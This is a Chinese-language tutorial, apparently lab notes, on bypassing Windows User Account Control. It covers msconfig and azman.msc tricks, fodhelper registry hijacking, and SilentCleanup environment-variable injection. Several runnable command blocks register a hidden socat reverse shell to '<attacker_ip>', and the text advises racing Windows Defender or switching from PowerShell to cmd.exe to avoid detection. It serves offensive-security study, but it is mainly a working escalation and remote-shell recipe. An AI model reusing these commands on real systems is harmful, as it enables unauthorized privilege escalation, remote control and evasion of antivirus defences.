# Bypassing UAC

了解在 Windows 主机中绕过用户帐户控制 （UAC） 的常见方法。

我们将研究绕过Windows系统可用的安全功能的常见方法，称为用户帐户控制（UAC）。此功能允许以低权限运行任何进程，而与运行该进程的人员（普通用户或管理员）无关。

我不会在此记录UAC的概念和作用，仅保留bypass uac

---

## 基于GUI的bypass

### msconfig

在Run中打开msconfig，切换到工具这一栏，在这里打开的cmd是运行于高IL

![在这里插入图片描述](https://img-blog.csdnimg.cn/35fdba5d4c7044ec8e0d33a328bb453e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/e213c1b8b71d4abb893f9d003c9be711.png)

### azman.msc

与msconfig一样，azman.msc将自动提升，而无需用户交互。如果我们能找到一种方法从该进程中生成 shell，我们将绕过 UAC。请注意，与msconfig不同，azman.msc没有预期的内置方法来生成shell。我们可以通过一点创造力轻松克服这一点。

在Run打开azman.msc -> 打开帮助 -> 在该页面上鼠标右键 -> 查看源

会打开一个记事本，这个记事本是运行在高IL的，通过记事本打开文件，打开cmd

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b8802ca048345fd8852b49b41191bd8.png)

## 自动提升

如前所述，某些可执行文件可以自动提升，无需任何用户干预即可实现高 IL。这适用于控制面板的大多数功能和 Windows 提供的某些可执行文件。

### Fodhelper

fodhelper 可以在使用默认 UAC 设置时自动提升，以便在执行标准管理任务时不会提示管理员提升权限。虽然我们已经看过 autoElevate 可执行文件，但与 msconfig 不同，fodhelper 可以在无法访问 GUI 的情况下被滥用。

我们需要关注的是，运行fodhelper时，它会从注册表寻找，当 Windows 打开文件时，它会检查注册表以了解要使用的应用程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/fee372a463f142da90145e78daf71b33.png)

	C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
	C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
	C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
	C:\> reg add %REG_KEY% /d %CMD% /f

当在cmd下直接运行fodhelper时，我们的shellcode将会被执行，并且是高IL

### Fodhelper的利用改进

事实上我们对注册表操作，注入shellcode的时候会被AV检测到

![在这里插入图片描述](https://img-blog.csdnimg.cn/8378c0ca84b44c61b4a6e809af971c72.png)

在将有问题的注册表值设置为反向 shell 所需的命令后，我们立即向该注册表值添加了快速查询。令人惊讶的是，查询输出我们的命令完好无损。我们仍然会收到Windows Defender的警报，一秒钟后，违规的注册表值将按预期删除。Windows Defender似乎需要一些时间来对我们的漏洞采取行动

我们可以在设置完注册表项的同时运行fodhelper

	...
	reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

fodhelper 可能会在 AV 启动之前执行，从而为您提供反向外壳。如果由于某种原因它对您不起作用，请记住，此方法不可靠，因为它取决于 AV 和首先执行的有效载荷之间的竞赛。

此外，还有另一个方法就是新建一个progID然后令fodhelper的ms-settings指向它

```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
```

此漏洞利用创建一个名为 .pwn 的新 progID，并将我们的有效负载与打开此类文件时使用的命令相关联。然后，它将 ms-settings 的 CurVer 条目指向我们的 .pwn progID。当 fodhelper 尝试打开 ms-settings 程序时，它将被指向 .pwn progID 并使用其关联的命令。

**尽管我们仍然被检测到，但必须注意的是，有时AV软件使用的检测方法是严格针对已发布的漏洞实施的，而不考虑可能的变化。如果我们将漏洞从 Powershell 转换为使用 cmd.exe，AV 不会引发任何警报**

## 环境变量扩展

### 磁盘清理计划任务

![在这里插入图片描述](https://img-blog.csdnimg.cn/f076b9a4f8e643a182bba09090a357ef.png)

**我们可以看到该任务配置为使用用户帐户运行，这意味着它将继承调用用户的权限。“以最高权限运行”选项将使用调用用户可用的最高特权安全令牌，这是管理员的高 IL 令牌。请注意，如果常规非管理员用户调用此任务，它将仅使用中等 IL 执行，因为这是非管理员可用的最高特权令牌，因此绕过不起作用。**

查看Actions

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb886947547043aa89c5015407384708.png)

由于该命令依赖于环境变量，因此我们可以通过它们注入命令，并通过手动启动 DiskCleanup 任务来执行它们。

将windir变量修改为：

	reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

最终任务执行的完整命令是：

	cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%

在我们的命令结束时，我们连接“&REM”（以空格结尾）来注释扩展环境变量以获取DiskCleanup使用的最终命令时所放置的任何内容。

运行定时任务：

	schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

shellcode将被执行，并且是高IL

## 自动化工具

一个出色的工具可用于测试 UAC 绕过，提供了开箱即用的 UAC 绕过技术的最新存储库

	https://github.com/hfiref0x/UACME

此外，我们的msf也有uac bypass模块